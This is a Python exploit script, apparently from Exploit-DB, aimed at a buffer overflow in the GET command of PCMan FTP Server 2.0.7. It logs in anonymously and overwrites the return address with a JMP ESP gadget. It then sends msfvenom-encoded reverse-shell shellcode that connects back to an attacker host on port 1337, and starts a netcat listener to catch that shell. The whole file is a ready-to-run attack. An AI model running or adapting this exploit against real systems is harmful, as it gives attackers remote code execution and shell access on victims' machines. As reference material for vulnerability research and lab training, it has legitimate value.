#!/usr/bin/env python
#---------------------------------------------------------------------------------------------#
# Software      = PCMan FTP Server 2.0.7 - 'GET'                                              #
# Download Link = https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z   #
# Date          = 12/28/2017                                                                  #
# Reference     = https://www.exploit-db.com/exploits/26471/                                  #
# Author        = @Anakein                                                                    #
# Tested on     = Windows XP SP3                                                              #
# EIP Offset    = 2006                                                                        #
# Badchars      = "\x00\x0A\x0D"                                                              #
# RET Address   = 0x7e45b310 : "\xFF\xE4" | [USER32.dll]                                      #
# Usage         = python exploit.py <target IP> <port>                                        #        
#---------------------------------------------------------------------------------------------#

import socket as so
import sys
import time
import struct
import subprocess
from tqdm import tqdm

try:
    server = str(sys.argv[1])
    port   = int(sys.argv[2])

except IndexError:
    print("Usage: python %s 10.0.1.114 21" % sys.argv[0])
    sys.exit(0)

#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.103 LPORT=1337 -f python -e x86/shikata_ga_nai 
#-b "\x00\x0a\x0d" EXECFUNC=thread        #(351 bytes)

crash = 3000
offset = 2006

buf = '\x41'*offset
buf += struct.pack("<L", 0x7e45b310)
buf += '\x90'*26
buf += "\xda\xd9\xd9\x74\x24\xf4\xbb\x48\x9e\x32\x9e\x5e\x33"
buf += "\xc9\xb1\x52\x31\x5e\x17\x83\xee\xfc\x03\x16\x8d\xd0"
buf += "\x6b\x5a\x59\x96\x94\xa2\x9a\xf7\x1d\x47\xab\x37\x79"
buf += "\x0c\x9c\x87\x09\x40\x11\x63\x5f\x70\xa2\x01\x48\x77"
buf += "\x03\xaf\xae\xb6\x94\x9c\x93\xd9\x16\xdf\xc7\x39\x26"
buf += "\x10\x1a\x38\x6f\x4d\xd7\x68\x38\x19\x4a\x9c\x4d\x57"
buf += "\x57\x17\x1d\x79\xdf\xc4\xd6\x78\xce\x5b\x6c\x23\xd0"
buf += "\x5a\xa1\x5f\x59\x44\xa6\x5a\x13\xff\x1c\x10\xa2\x29"
buf += "\x6d\xd9\x09\x14\x41\x28\x53\x51\x66\xd3\x26\xab\x94"
buf += "\x6e\x31\x68\xe6\xb4\xb4\x6a\x40\x3e\x6e\x56\x70\x93"
buf += "\xe9\x1d\x7e\x58\x7d\x79\x63\x5f\x52\xf2\x9f\xd4\x55"
buf += "\xd4\x29\xae\x71\xf0\x72\x74\x1b\xa1\xde\xdb\x24\xb1"
buf += "\x80\x84\x80\xba\x2d\xd0\xb8\xe1\x39\x15\xf1\x19\xba"
buf += "\x31\x82\x6a\x88\x9e\x38\xe4\xa0\x57\xe7\xf3\xc7\x4d"
buf += "\x5f\x6b\x36\x6e\xa0\xa2\xfd\x3a\xf0\xdc\xd4\x42\x9b"
buf += "\x1c\xd8\x96\x0c\x4c\x76\x49\xed\x3c\x36\x39\x85\x56"
buf += "\xb9\x66\xb5\x59\x13\x0f\x5c\xa0\xf4\x3a\xa1\xab\x63"
buf += "\x53\xa3\xab\x6e\x9a\x2a\x4d\x1a\xcc\x7a\xc6\xb3\x75"
buf += "\x27\x9c\x22\x79\xfd\xd9\x65\xf1\xf2\x1e\x2b\xf2\x7f"
buf += "\x0c\xdc\xf2\x35\x6e\x4b\x0c\xe0\x06\x17\x9f\x6f\xd6"
buf += "\x5e\xbc\x27\x81\x37\x72\x3e\x47\xaa\x2d\xe8\x75\x37"
buf += "\xab\xd3\x3d\xec\x08\xdd\xbc\x61\x34\xf9\xae\xbf\xb5"
buf += "\x45\x9a\x6f\xe0\x13\x74\xd6\x5a\xd2\x2e\x80\x31\xbc"
buf += "\xa6\x55\x7a\x7f\xb0\x59\x57\x09\x5c\xeb\x0e\x4c\x63"
buf += "\xc4\xc6\x58\x1c\x38\x77\xa6\xf7\xf8\x87\xed\x55\xa8"
buf += "\x0f\xa8\x0c\xe8\x4d\x4b\xfb\x2f\x68\xc8\x09\xd0\x8f"
buf += "\xd0\x78\xd5\xd4\x56\x91\xa7\x45\x33\x95\x14\x65\x16"

buffer = buf
try:
    print("Connecting to host %s %d " % (server, port))
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    s.connect((server, port))
    s.recv(1024)
    print("Login in FTP")
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PASS anonymous\r\n')
    s.recv(1024)
    print("Sending evil payload")
    for i in tqdm(range(5)):
        time.sleep(2)
    s.send('GET ' + buffer + '\r\n')
    print("Incoming revshell")
    subprocess.call(['nc -lvp 1337'], shell=True)
    
except Exception, msg:
    print("Error connecting ")
    sys.exit(0)
